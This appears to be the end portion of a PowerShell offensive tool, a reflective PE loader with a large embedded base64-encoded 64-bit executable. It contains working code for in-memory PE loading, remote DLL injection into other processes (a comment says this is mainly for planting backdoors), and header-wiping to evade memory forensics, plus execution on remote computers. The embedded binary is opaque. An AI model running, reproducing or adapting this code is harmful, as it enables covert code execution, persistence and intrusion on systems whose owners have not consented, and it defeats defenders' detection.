				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

$executable64 = "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